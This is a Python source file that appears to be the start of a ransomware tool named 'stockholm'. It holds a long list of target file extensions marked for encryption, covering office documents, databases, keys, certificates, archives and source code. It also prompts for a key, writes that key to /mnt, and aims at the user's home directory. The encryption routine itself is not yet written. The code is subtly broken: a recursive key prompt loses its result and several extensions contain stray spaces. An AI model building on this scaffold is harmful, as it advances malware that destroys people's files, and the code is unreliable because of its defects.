#!/usr/bin/Python3.8

from distutils import extension
from pkgutil import extend_path
from banner.banner_ import logo
from args.args import ft_args
from clear.clear import clear
import parser
import os
import sys
import time


class stockholm(object):
    # Constructor
    extensiones = [".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2 ", ".docb", ".potx", ".sldx", ".jpeg",
                    ".mp4", ".dch", ".frm", ".slk ", ".docm", ".potm", ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif ", ".dot",
                    ".pst", ".sldm", ".bmp", ".avi", ".pl", ".dbf", ".stc ", ".dotm", ".ost", ".vdi", ".png", ".asf", ".vb",
                    ".db", ".sxc ", ".dotx", ".msg", ".vmdk", ".gif", ".mpeg", ".vbs", ".mdb", ".ots ", ".xls", ".eml", ".vmx",
                    ".raw", ".vob", ".ps1", ".accdb", ".ods ", ".xlsm", ".vsd", ".aes", ".tif", ".wmv", ".cmd", ".sqlitedb",
                    ".max ", ".xlsb", ".vsdx", ".ARC", ".tiff", ".fla", ".js", ".sqlite3", ".3ds ", ".xlw", ".txt", ".PAQ",
                    ".nef", ".swf", ".asm", ".asc", ".uot ", ".xlt", ".csv", ".bz2", ".psd", ".wav", ".h", ".lay6", ".stw",
                    ".xlm", ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw ", ".xlc", ".123", ".bak", ".svg", ".sh",
                    ".cpp", ".mml", ".ott ", ".xltx", ".wks", ".tar", ".djvu", ".class", ".c", ".sxm", ".odt ", ".xltm", ".wk1",
                    ".tgz", ".m4u", ".jar", ".cs", ".otg", ".pem ", ".ppt", ".pdf", ".gz", ".m3u", ".java", ".suo", ".odg",
                    ".p12 ", ".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop", ".csr ", ".pptm", ".onetoc2", ".rar",
                    ".wma", ".asp", ".ldf", ".std", ".crt ", ".pot", ".snt", ".zip", ".flv", ".php", ".mdf", ".sxd", ".key ",
                    ".pps", ".hwp", ".backup", ".3g2", ".jsp", ".ibd", ".otp", ".pfx ", ".ppsm", ".602", ".iso", ".mkv",
                    ".brd", ".myi", ".odp", ".der ", ".ppsx", ".sxi"]  # List of extensions to be encrypted and decrypted

    def __init__(self): # Constructor of the class (self is the object itself)
        self.clear() # Clear the terminal
        self.slowprint(logo) # Print the banner
        self.args = ft_args()
        self.key = self.keygen() # Generate the key
        #self.key = None # Key to encrypt and decrypt files (None = not defined) esto es un constructor
        self.crypt = None
        self.files = [] # List of files to be encrypted and decrypted
        # System root is the home directory of the user
        self.sysRoot = ('~')

    def clear(self):
        clear()

    def keygen(self):
        key = input(" La clave debe tener 16 caracteres o más :  ")
        if len(key) < 16:
            print("\nKey must be 16 characters or more: \n")
            self.keygen() # Recursive call to the function esto es recursividad lol xd
        else:
            self.key = key
            print("\nKey generated successfully \n")
            #self.clear()
        SaveKey = open("/mnt/Stockholm.key.txt", "w") # Save the key in a file in the mnt directory of the system
        SaveKey.write(self.key)
        SaveKey.close()
        time.sleep(0.019) # Wait 0.019 seconds to continue
        return self.key


    def slowprint(self, n):
        for word in n + '\n':
            sys.stdout.write(word)
            sys.stdout.flush()
            time.sleep(0.0033)



########################################################################################################################

#os.rename('archivo.txt', 'dir') # renombrar archivos
stockholm = stockholm()
